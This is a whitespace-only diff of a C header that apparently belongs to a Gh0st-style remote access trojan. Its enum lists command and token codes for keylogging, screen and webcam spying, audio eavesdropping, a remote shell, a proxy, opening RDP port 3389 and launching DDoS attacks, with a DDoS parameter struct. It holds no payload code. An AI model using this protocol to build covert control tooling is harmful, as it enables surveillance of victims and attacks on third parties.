@@ -14,7 +14,7 @@ enum
 	TRANSFER_MODE_JUMP,				// 覆盖
 	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
 	TRANSFER_MODE_CANCEL,			// 取消传送
-	
+
 	// 控制端发出的命令
 	COMMAND_ACTIVED = 0x00,			// 服务端可以激活开始工作
 	COMMAND_LIST_DRIVE,				// 列出磁盘目录
@@ -35,7 +35,7 @@ enum
 	///下面是增加的rar操作文件模块
 	COMMAND_PACK_RAR,			// 压缩到rar文件
 	COMMAND_UNPACK_RAR,			// 解压rar文件
-	
+
 	COMMAND_SCREEN_SPY,				// 屏幕查看
 	COMMAND_SCREEN_RESET,			// 改变屏幕深度
 	COMMAND_ALGORITHM_RESET,		// 改变算法
@@ -74,7 +74,7 @@ enum
 	COMMAND_RENAME_REMARK,			// 重命名备注
 	COMMAND_REPLAY_HEARTBEAT,		// 回复心跳包
 
-	
+
 	COMMAND_SVLIST,					// 服务列表
 	COMMAND_SERVICE_AUTOSTART,		//自动启动
 	COMMAND_SERVICE_DEMANDSTART,	//手动
@@ -84,16 +84,16 @@ enum
 	COMMAND_SERVICE_STOP,		//停止
 
 	COMMAND_SYSINFOLIST,				//系统信息
-	
+
 	COMMAND_PROXY,					// proxy
 	COMMAND_PROXY_CONNECT, //socket5代理
 	COMMAND_PROXY_CLOSE,
 	COMMAND_PROXY_DATA,
-		
+
 	COMMAND_OPEN_3389,				//开启3389
 	COMMAND_SORT_PROCESS,              //筛选进程
 	COMMAND_SORT_WINDOW,				//筛选窗体
-	
+
 	COMMAND_DDOS,				//DDOS
 
 	// 服务端发出的标识
@@ -112,7 +112,7 @@ enum
 	TOKEN_DATA_CONTINUE,			// 继续传输数据
 	TOKEN_RENAME_FINISH,			// 改名操作完成
 	TOKEN_EXCEPTION,				// 操作发生异常
-	
+
 	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
 	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
 	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
@@ -121,23 +121,23 @@ enum
 
 	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头的BITMAPINFOHEADER
 	TOKEN_WEBCAM_DIB,				// 摄像头的图像数据
-	
+
 	TOKEN_AUDIO_START,				// 开始语音监听
 	TOKEN_AUDIO_DATA,				// 语音监听数据
 
 	TOKEN_KEYBOARD_START,			// 键盘记录开始
 	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据
-	
+
 	TOKEN_PSLIST,					// 进程列表
 	TOKEN_WSLIST,					// 窗口列表
 	TOKEN_SVLIST,					// 服务列表
 	TOKEN_SYSINFOLIST,				// 系统信息列表
 
 	TOKEN_SHELL_START,				// 远程终端开始
-	
+
 	TOKEN_INFO_YES,						// 筛选
 	TOKEN_INFO_NO,						// 筛选
-	
+
 	TOKEN_PROXY_START,//proxy start.
 	TOKEN_PROXY_CONNECT_RESULT,
 	TOKEN_PROXY_CLOSE,
@@ -173,7 +173,7 @@ typedef struct _DDOSST
 	int time;
 	int thread;
 	LPVOID res;
-}DDOSST,*LPDDOSST;
+}DDOSST, *LPDDOSST;
 
 #define	MAX_WRITE_RETRY			15 // 重试写入文件次数
 #define	MAX_SEND_BUFFER			1024 * 8 // 最大发送数据长度
